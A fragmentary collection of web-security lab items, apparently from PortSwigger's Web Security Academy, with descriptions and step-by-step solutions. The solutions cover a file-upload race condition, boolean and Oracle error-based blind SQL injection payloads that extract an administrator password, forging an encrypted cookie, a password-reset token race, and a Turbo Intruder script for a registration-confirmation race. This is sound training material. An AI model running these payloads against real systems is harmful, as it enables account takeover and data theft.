The simplest way to do this is to copy the GET /files/avatars/<YOUR-IMAGE> request from your proxy history, then change the filename in the path to exploit.php.\n\nAt the bottom of the Turbo Intruder window, click Attack. This script will submit a single POST request to upload your exploit.php file, instantly followed by 5 GET requests to /files/avatars/exploit.php.\n\nIn the results list, notice that some of the GET requests received a 200 response containing Carlos's secret. These requests hit the server after the PHP file was uploaded, but before it failed validation and was deleted.\n\nSubmit the secret to solve the lab.\n\nNote: If you choose to build the GET request manually, make sure you terminate it properly with a \\r\\n\\r\\n sequence.

        "solution": "Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the TrackingId cookie. For simplicity, let's say the original value of the cookie is TrackingId=xyz .\nModify the TrackingId cookie, changing it to: TrackingId=xyz' AND '1'='1\nVerify that the Welcome back message appears in the response.\nNow change it to: TrackingId=xyz' AND '1'='2\nVerify that the Welcome back message does not appear in the response. This demonstrates how you can test a single boolean condition and infer the result.\nNow change it to: TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a\nVerify that the condition is true, confirming that there is a table called users .\nNow change it to: TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a\nVerify that the condition is true, confirming that there is a user called administrator .\nThe next step is to determine how many characters are in the password of the administrator user. To do this, change the value to: TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a\nThis condition should be true, confirming that the password is greater than 1 character in length.\nSend a series of follow-up values to test different password lengths. Send: TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a\nThen send: TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a\nAnd so on. You can do this manually using Burp Repeater , since the length is likely to be short. When the condition stops being true (i.e. when the Welcome back message disappears), you have determined the length of the password, which is in fact 20 characters long.\nAfter determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use Burp Intruder . Send the request you are working on to Burp Intruder, using the context menu.\nIn Burp Intruder, change the value of the cookie to: TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a\nThis uses the SUBSTRING() function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.\nPlace payload position markers around the final a character in the cookie value. To do this, select just the a , and click the Add \u00a7 button. You should then see the following as the cookie value (note the payload position markers): TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='\u00a7a\u00a7\nTo test the character at each position, you'll need to send suitable payloads in the payload position that you've defined. You can assume that the password contains only lowercase alphanumeric characters. In the Payloads side panel, check that Simple list is selected, and under Payload configuration add the payloads in the range a - z and 0 - 9. You can select these easily using the Add from list drop-down.\nTo be able to tell when the correct character was submitted, you'll need to grep each response for the expression Welcome back . To do this, click on the Settings tab to open the Settings side panel. In the Grep - Match section, clear existing entries in the list, then add the value Welcome back .\nLaunch the attack by clicking the Start attack button.\nReview the attack results to find the value of the character at the first position.

        "description": "This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message. The database contains a different table called users , with columns called username and password . You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user. To solve the lab, log in as the administrator user.",
        "hint": "This lab uses an Oracle database. For more information, see the SQL injection cheat sheet.",
        "solution": "Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the TrackingId cookie. For simplicity, let's say the original value of the cookie is TrackingId=xyz . Modify the TrackingId cookie, appending a single quotation mark to it: TrackingId=xyz' Verify that an error message is received. Now change it to two quotation marks: TrackingId=xyz'' Verify that the error disappears. This suggests that a syntax error (in this case, the unclosed quotation mark) is having a detectable effect on the response. You now need to confirm that the server is interpreting the injection as a SQL query i.e. that the error is a SQL syntax error as opposed to any other kind of error. To do this, you first need to construct a subquery using valid SQL syntax. Try submitting: TrackingId=xyz'||(SELECT '')||' In this case, notice that the query still appears to be invalid. This may be due to the database type - try specifying a predictable table name in the query: TrackingId=xyz'||(SELECT '' FROM dual)||' As you no longer receive an error, this indicates that the target is probably using an Oracle database, which requires all SELECT statements to explicitly specify a table name. Now that you've crafted what appears to be a valid query, try submitting an invalid query while still preserving valid SQL syntax. For example, try querying a non-existent table name: TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||' This time, an error is returned. This behavior strongly suggests that your injection is being processed as a SQL query by the back-end. As long as you make sure to always inject syntactically valid SQL queries, you can use this error response to infer key information about the database. For example, in order to verify that the users table exists, send the following query: TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||' As this query does not return an error, you can infer that this table does exist. Note that the WHERE ROWNUM = 1 condition is important here to prevent the query from returning more than one row, which would break our concatenation. You can also exploit this behavior to test conditions. First, submit the following query: TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||' Verify that an error message is received. Now change it to: TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||' Verify that the error disappears. This demonstrates that you can trigger an error conditionally on the truth of a specific condition. The CASE statement tests a condition and evaluates to one expression if the condition is true, and another expression if the condition is false. The former expression contains a divide-by-zero, which causes an error. In this case, the two payloads test the conditions 1=1 and 1=2 , and an error is received when the condition is true . You can use this behavior to test whether specific entries exist in a table. For example, use the following query to check whether the username administrator exists: TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' Verify that the condition is true (the error is received), confirming that there is a user called administrator . The next step is to determine how many characters are in the password of the administrator user. To do this, change the value to: TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||' This condition should be true, confirming that the password is greater than 1 character in length. Send a series of follow-up values to test different password lengths. Send: TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' Then send: TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' And so on. You can do this manually using Burp Repeater , since the length is likely to be short. When the condition stops being true (i.e. when the error disappears), you have determined the length of the password, which is in fact 20 characters long. After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use Burp Intruder . Send the request you are working on to Burp Intruder, using the context menu. Go to Burp Intruder and change the value of the cookie to: TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' This uses the SUBSTR() function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn. Place payload position markers around the final a character in the cookie value. To do this, select just the a , and click the \"Add \u00a7\" button. You should then see the following as the cookie value (note the payload position markers): TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='\u00a7a\u00a7' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' To test the character at each position, you'll need to send suitable payloads in the payload position that you've defined. You can assume that the password contains only lowercase alphanumeric characters. In the \"Payloads\" side panel, check that \"Simple list\" is selected, and under \"Payload configuration\" add the payloads in the range a - z and 0 - 9. You can select these easily using the \"Add from list\" drop-down. Launch the attack by clicking the \" Start attack\" button. Review the attack results to find the value of the character at the first position. The application returns an HTTP 500 status code when the error occurs, and an HTTP 200 status code normally. The \"Status\" column in the Intruder results shows the HTTP status code, so you can easily find the row with 500 in this column. The payload showing for that row is the value of the character at the first position. Now, you simply need to re-run the attack for each of the other character positions in the password, to determine their value. To do this, go back to the original Intruder tab, and change the specified offset from 1 to 2. You should then see the following as the cookie value: TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,2,1)='\u00a7a\u00a7' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' Launch the modified attack, review the results, and note the character at the second offset. Continue this process testing offset 3, 4, and so on, until you have the whole password. In the browser, click \"My account\" to open the login page.

        "solution": "Send the POST /post/comment and the subsequent GET /post?postId=x request (containing the notification cookie) to Burp Repeater. In Repeater, observe that you can use the email parameter of the POST request to encrypt arbitrary data and reflect the corresponding ciphertext in the Set-Cookie header. Likewise, you can use the notification cookie in the GET request to decrypt arbitrary ciphertext and reflect the output in the error message. For simplicity, double-click the tab for each request and rename the tabs encrypt and decrypt respectively. In the decrypt request, copy your stay-logged-in cookie and paste it into the notification cookie. Send the request. Instead of the error message, the response now contains the decrypted stay-logged-in cookie, for example: wiener:1598530205184. This reveals that the cookie should be in the format username:timestamp. Copy the timestamp to your clipboard. Go to the encrypt request and change the email parameter to administrator:your-timestamp. Send the request and then copy the new notification cookie from the response. Decrypt this new cookie and observe that the 23-character \" Invalid email address: \" prefix is automatically added to any value you pass in using the email parameter. Send the notification cookie to Burp Decoder. In Decoder, URL-decode and Base64-decode the cookie. In Burp Repeater, switch to the message editor's \"Hex\" tab. Select the first 23 bytes, then right-click and select \"Delete selected bytes\". Re-encode the data and copy the result into the notification cookie of the decrypt request. When you send the request, observe that an error message indicates that a block-based encryption algorithm is used and that the input length must be a multiple of 16. You need to pad the \" Invalid email address: \" prefix with enough bytes so that the number of bytes you will remove is a multiple of 16. In Burp Repeater, go back to the encrypt request and add 9 characters to the start of the intended cookie value, for example: xxxxxxxxxadministrator:your-timestamp. Encrypt this input and use the decrypt request to test that it can be successfully decrypted. Send the new ciphertext to Decoder, then URL and Base64-decode it. This time, delete 32 bytes from the start of the data. Re-encode the data and paste it into the notification parameter in the decrypt request. Check the response to confirm that your input was successfully decrypted and, crucially, no longer contains the \" Invalid email address: \" prefix. You should only see administrator:your-timestamp. From the proxy history, send the GET / request to Burp Repeater. Delete the session cookie entirely, and replace the stay-logged-in cookie with the ciphertext of your self-made cookie.

From the response, copy the newly issued session cookie and CSRF token and use them to replace the respective values in one of the two POST /forgot-password requests. You now have a pair of password reset requests from two different sessions.    Send the two POST requests in parallel a few times and observe that the processing times are now much more closely aligned, and sometimes identical.    Confirm the vulnerability    Go back to your inbox and notice that when the response times match for the pair of reset requests, this results in two confirmation emails that use an identical token. This confirms that a timestamp must be one of the inputs for the hash.    Consider that this also means the token would be predictable if you knew the other inputs for the hash function.

        "solution": "Predict a potential collision. Study the user registration mechanism. Observe that: You can only register using @ginandjuice.shop email addresses. To complete the registration, you need to visit the confirmation link, which is sent via email. As you don't have access to an @ginandjuice.shop email account, you don't appear to have a way to access a valid confirmation link. In Burp, from the proxy history, notice that there is a request to fetch /resources/static/users.js. Study the JavaScript and notice that this dynamically generates a form for the confirmation page, which is presumably linked from the confirmation email. This leaks the fact that the final confirmation is submitted via a POST request to /confirm, with the token provided in the query string. In Burp Repeater, create an equivalent request to what your browser might send when clicking the confirmation link. For example: POST /confirm?token=1 HTTP/2 Host: YOUR-LAB-ID.web-security-academy.net Content-Type: x-www-form-urlencoded Content-Length: 0. Experiment with the token parameter in your newly crafted confirmation request. Observe that: If you submit an arbitrary token, you receive an Incorrect token: <YOUR-TOKEN> response. If you remove the parameter altogether, you receive a Missing parameter: token response. If you submit an empty token parameter, you receive a Forbidden response. Consider that this Forbidden response may indicate that the developers have patched a vulnerability that could be exploited by sending an empty token parameter. Consider that there may be a small race window between: When you submit a request to register a user. When the newly generated registration token is actually stored in the database. If so, there may be a temporary sub-state in which null (or equivalent) is a valid token for confirming the user's registration. Experiment with different ways of submitting a token parameter with a value equivalent to null. For example, some frameworks let you to pass an empty array as follows: POST /confirm?token[]=. Observe that this time, instead of the Forbidden response, you receive an Invalid token: Array response. This shows that you've successfully passed in an empty array, which could potentially match an uninitialized registration token. Benchmark the behavior. Send the POST /register request to Burp Repeater. In Burp Repeater, experiment with the registration request. Observe that if you attempt to register the same username more than once, you get a different response. In a separate Repeater tab, use what you've learned from the JavaScript import to construct a confirmation request with an arbitrary token. For example: POST /confirm?token=1 HTTP/2 Host: YOUR-LAB-ID.web-security-academy.net Cookie: phpsessionid=YOUR-SESSION-ID Content-Type: application/x-www-form-urlencoded Content-Length: 0. Add both requests to a new tab group. Try sending both requests sequentially and in parallel several times, making sure to change the username in the registration request each time to avoid hitting the separate Account already exists with this name code path. For details on how to do this, see Sending grouped HTTP requests. Notice that the confirmation response consistently arrives much quicker than the response to the registration request. Prove the concept. Note that you need the server to begin creating the pending user in the database, then compare the token you send in the confirmation request before the user creation is complete. Consider that as the confirmation response is always processed much more quickly, you need to delay this so that it falls within the race window. In the POST /register request, highlight the value of the username parameter, then right-click and select Extensions > Turbo Intruder > Send to turbo intruder. In Turbo Intruder, in the request editor: Notice that the value of the username parameter is automatically marked as a payload position with the %s placeholder. Make sure the email parameter is set to an arbitrary @ginandjuice.shop address that is not likely to already be registered on the site. Make a note of the static value of the password parameter. You'll need this later. From the drop-down menu, select the examples/race-single-packet-attack.py template. In the Python editor, modify the main body of the template as follows: Define a variable containing the confirmation request you've been testing in Repeater. Create a loop that queues a single registration request using a new username for each attempt. Set the gate argument to match the current iteration. Create a nested loop that queues a large number of confirmation requests for each attempt. These should also use the same release gate. Open the gate for all the requests in each attempt at the same time. The resulting script should look something like this: def queueRequests(target, wordlists): engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1, engine=Engine.BURP2 ) confirmationReq = '''POST /confirm?token[]= HTTP/2 Host: YOUR-LAB-ID.web-security-academy.net Cookie: phpsessionid=YOUR-SESSION-TOKEN Content-Length: 0 ''' for attempt in range(20): currentAttempt = str(attempt) username = 'User' + currentAttempt # queue a single registration request engine.queue(target.req, username, gate=currentAttempt) # queue 50 confirmation requests - note that this will probably sent in two separate packets for i in range(50): engine.queue(confirmationReq, gate=currentAttempt) # send all the queued requests for this attempt engine.openGate(currentAttempt) def handleResponse(req, interesting): table.add(req) Launch the attack. In the results table, sort the results by the Length column. If the attack was successful, you should see one or more 200 responses to your confirmation request containing the message Account registration for user <USERNAME> successful. Make a note of the username from one of these responses. If you used the example script above, this will be something like User4. In the browser, log in using this username and the static password you used in the registration request. Access the admin panel and delete carlos to solve the lab."
